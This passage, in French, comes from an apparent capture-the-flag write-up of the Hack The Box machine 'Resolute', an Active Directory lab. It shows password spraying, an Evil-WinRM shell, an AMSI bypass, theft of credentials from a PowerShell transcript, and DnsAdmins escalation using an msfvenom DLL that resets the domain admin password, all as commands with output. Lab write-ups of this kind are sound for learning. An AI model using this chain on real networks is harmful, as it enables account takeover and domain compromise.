UF_DONT_REQUIRE_PREAUTH set\n[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User resolute doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] invalid principal syntax\n</code></pre> <p>Rien :). Samba ne donne rien non plus. Je tente alors une \u00e9num\u00e9ration du LDAP :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec ldap 10.129.167.19 -u \"\" -p \"\" -M get-desc-users\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nLDAP        10.129.167.19   389    RESOLUTE         [+] megabank.local\\:\nGET-DESC... 10.129.167.19   389    RESOLUTE         [+] Found following users:\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: Administrator description: Built-in account for administering the computer/domain\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: DefaultAccount description: A user account managed by the system.\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: krbtgt description: Key Distribution Center Service Account\nGET-DESC... 10.129.167.19   389    RESOLUTE         User: marko description: Account created. Password set to Welcome123!\n</code></pre> <p>On a un utilisateur et un pass ! On confirme la connexion :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u marko -p 'Welcome123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\marko:Welcome123! STATUS_LOGON_FAILURE\n</code></pre> <p>Et... le pass ne fonctionne pas. Comme il est dit que c'est le password utilis\u00e9 \u00e0 la cr\u00e9ation d'un compte, je tente donc un password-spraying sur ma liste d'utilisateur:</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u users.txt -p 'Welcome123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\steve:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\fred:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\marcus:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\simon:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\ryan:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\stevie:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\angela:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\claire:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\\claude:Welcome123! STATUS_LOGON_FAILURE\nSMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\\melanie:Welcome123!\n</code></pre> <p>Et l\u00e0 on a un truc. Et m\u00eame une connexion via WinRM :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.129.167.19 -u melanie -p 'Welcome123!'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt;\n</code></pre> <p>L'utilisateur ne semble pas avoir de droits particuliers :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name        SID\n================ ===============================================\nmegabank\\melanie S-1-5-21-1392959593-3013219662-3596683436-10101\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ==================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level     Label            S-1-16-8192\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Winpeas n'a rien donn\u00e9 de particulier, on lance alors adpeas qui servira ensuite \u00e0 alimenter notre bloodhound :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Bypass-4MSI\n\nInfo: Patching 4MSI, please be patient...\n\n[+] Success!\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; dir\n\n\n    Directory: C:\\Users\\melanie\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        3/18/2024   4:34 PM        3119779 adPEAS.ps1\n-a----        3/18/2024   4:27 PM        2234368 winPEASx64_ofs.exe\n\n\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Import-Module .\\adPEAS.ps1\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; Invoke-adpeas\n</code></pre> <p>Bloodhound ne donne rien de particulier... Je chercher alors quelques trucs \u00e0 la main.</p> <pre><code>*Evil-WinRM* PS C:\\&gt; dir -force\n\n    Directory: C:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--hs-        3/18/2024   4:29 PM                $RECYCLE.BIN\nd--hsl        9/25/2019  10:17 AM                Documents and Settings\nd-----        9/25/2019   6:19 AM                PerfLogs\nd-r---        9/25/2019  12:39 PM                Program Files\nd-----       11/20/2016   6:36 PM                Program Files (x86)\nd--h--        9/25/2019  10:48 AM                ProgramData\nd--h--        12/3/2019   6:32 AM                PSTranscripts\nd--hs-        9/25/2019  10:17 AM                Recovery\nd--hs-        9/25/2019   6:25 AM                System Volume Information\nd-r---        12/4/2019   2:46 AM                Users\nd-----        12/4/2019   5:15 AM                Windows\n-arhs-       11/20/2016   5:59 PM         389408 bootmgr\n-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT\n-a-hs-        3/18/2024   3:48 PM      402653184 pagefile.sys\n\n\n*Evil-WinRM* PS C:\\&gt; cd PSTranscripts\n*Evil-WinRM* PS C:\\PSTranscripts&gt; dir\n*Evil-WinRM* PS C:\\PSTranscripts&gt; dir -force\n\n\n    Directory: C:\\PSTranscripts\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--h--        12/3/2019   6:45 AM                20191203\n\n\n*Evil-WinRM* PS C:\\PSTranscripts&gt; cd 20191203\n*Evil-WinRM* PS C:\\PSTranscripts\\20191203&gt; dir -force\n\n\n    Directory: C:\\PSTranscripts\\20191203\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt\n</code></pre> <p>\u00e0 l'int\u00e9rieur de ce .txt :</p> <pre><code>&gt;&gt; ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n</code></pre> <p>Le pass fonctionne :</p> <pre><code>pak@DESKTOP-AF1CU53:~$ netexec smb 10.129.167.19 -u ryan -p 'Serv3r4Admin4cc123!'\nSMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\\ryan:Serv3r4Admin4cc123! (Pwn3d!)\n</code></pre> <p></p> <p>L'utilisateur fait parti du groupe \"dnsadmins\" : il peut s'agir d'un vecteur de privesc vers l'utilisateur admin.</p> <pre><code>pak@DESKTOP-AF1CU53:~$ msfvenom -p windows/x64/exec cmd='net user administrator pakpak123! /domain' -f dll -o adduser.dll\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 309 bytes\nFinal size of dll file: 9216 bytes\nSaved as: adduser.dll\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; upload /home/pak/adduser.dll\n\nInfo: Uploading /home/pak/adduser.dll to C:\\Users\\ryan\\Documents\\adduser.dll\n\nData: 12288 bytes of 12288 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dir\n\n\n    Directory: C:\\Users\\ryan\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        3/18/2024   5:01 PM              0 adduser.dll\n-a----        3/18/2024   4:58 PM              5 start\n-a----        3/18/2024   4:58 PM              5 stop\n\n\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dnscmd.exe /config /serverlevelplugindll C:\\Users\\ryan\\Documents\\adduser.dll\n\nRegistry property serverlevelplugindll successfully reset.\nCommand completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; cmd.exe /c 'sc stop dns'\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; cmd.exe /c 'sc start dns'\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 1496\n        FLAGS              :\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt;\n</code></pre> <p>Et on est root :) !</p>"}]}